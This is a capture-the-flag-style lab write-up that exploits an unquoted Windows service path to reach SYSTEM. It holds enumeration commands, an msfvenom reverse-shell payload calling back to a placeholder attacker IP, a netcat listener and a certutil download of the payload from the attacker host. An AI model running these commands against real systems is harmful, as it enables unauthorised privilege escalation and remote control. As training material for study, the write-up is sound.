# LAB — Unquoted Service Paths

> **Lab:** [TryHackMe — Windows 10 PrivEsc](https://tryhackme.com/room/windows10privesc)
> **Goal:** Exploit Windows path resolution on an unquoted service path → place a payload in a writable parent directory → get `NT AUTHORITY\SYSTEM`

---

## Concept

When a service binary path:
1. **Contains whitespaces** (e.g., `C:\Program Files\Some Folder\app.exe`)
2. **Is NOT enclosed in double quotes**

…Windows doesn't know where the path "ends" at each space, so it follows a **Path Resolution Search Order**, testing executables at every whitespace boundary from left to right.

> [!IMPORTANT]
> Wrapping paths in double quotes (`"C:\Program Files\..."`) tells Windows to treat the entire string as one literal path, preventing this vulnerability.

---

## Path Resolution Search Order — Example

For an unquoted path:
```
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
```

Windows checks in order:

| Step | Windows Tries to Execute | Stops If Found |
|------|--------------------------|----------------|
| 1    | `C:\Program.exe` | ✅ |
| 2    | `C:\Program Files\Unquoted.exe` | ✅ |
| 3    | `C:\Program Files\Unquoted Path.exe` | ✅ |
| 4    | `C:\Program Files\Unquoted Path Service\Common.exe` | ✅ |
| 5    | `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe` | (actual binary) |

If we have **write access** to any parent directory in that chain, we can place a payload matching the expected filename, and it will execute **before** the real binary — under the service's privileged context.

## Step 1 — Enumerate Unquoted Paths

### Manual enumeration with `wmic`

```cmd
wmic service get name, startname, pathname
```

**What to look for:**
1. Paths **without** double quotes (`" "`)
2. Custom/third-party services (not default Windows)
3. Binaries **outside** `System32` (in `Program Files`, `Temp`, `Users`, etc.)
4. Running as **LocalSystem**

**Example finding:**

```
unquotedsvc    C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe    LocalSystem
```

No quotes + spaces in path + LocalSystem = **exploitable**

### Automated enumeration with PowerUp

```bash
python3 -m http.server 8000
```

```cmd
powershell iwr http://<KALI_IP>:8000/PowerUp.ps1 -o PowerUp.ps1
powershell
```

```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

Look for the section: `[*] Checking for unquoted service paths...`

You can also use the targeted function:

```powershell
Get-ServiceUnquoted
```

## Step 2 — Find a Writable Directory in the Path Chain

Check permissions on each parent directory recursively, from root to deepest:

```cmd
icacls C:\
icacls "C:\Program Files"
icacls "C:\Program Files\Unquoted Path Service"
icacls "C:\Program Files\Unquoted Path Service\Common Files"
```

**Result — writable directory found:**

```
C:\Program Files\Unquoted Path Service BUILTIN\Users:(F)
                                       NT SERVICE\TrustedInstaller:(I)(F)
                                       NT AUTHORITY\SYSTEM:(I)(F)
                                       BUILTIN\Administrators:(I)(F)
                                       BUILTIN\Users:(I)(RX)
                                       BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                       CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

`BUILTIN\Users:(F)` → **Full access** on `C:\Program Files\Unquoted Path Service\`

---

## Step 3 — Determine the Required Filename

Since we can write to `C:\Program Files\Unquoted Path Service\`, we look at what Windows will search for at this level:

```
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
                                       ^^^^^^
                                       Space here → Windows looks for "Common.exe"
```

**Required payload name:** `Common.exe`
**Required placement:** `C:\Program Files\Unquoted Path Service\Common.exe`

## Step 4 — Exploitation

### Generate the payload with the correct filename

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o Common.exe
```

### Start listener on Kali

```bash
rlwrap -cAr nc -lvnp 4444
```

### Transfer payload to the writable directory

```bash
python3 -m http.server 8000
```

```cmd
certutil -f -urlcache http://<KALI_IP>:8000/Common.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

### Start the service

```cmd
net start unquotedsvc
```

## Quick Reference — Unquoted Service Path Attack Flow

```
1. wmic service get name, startname, pathname   → Find unquoted paths with spaces
2. sc qc <service>                               → Confirm LocalSystem
3. icacls "<each parent dir>"                    → Find writable directory (W/M/F)
4. Determine payload filename from search order  → e.g., Common.exe
5. msfvenom ... -f exe -o <filename>.exe         → Generate payload
6. Place payload in writable directory           → certutil / copy
7. nc -lvnp <port>                               → Start listener
8. net start <service>                           → Trigger → NT AUTHORITY\SYSTEM
```

> [!TIP]
> **Connection to DLL Hijacking:** This search order resolution concept is the same as DLL Hijacking — Windows follows a defined search order to locate `.dll` files. Mastering path resolution here makes DLL Hijacking easy.
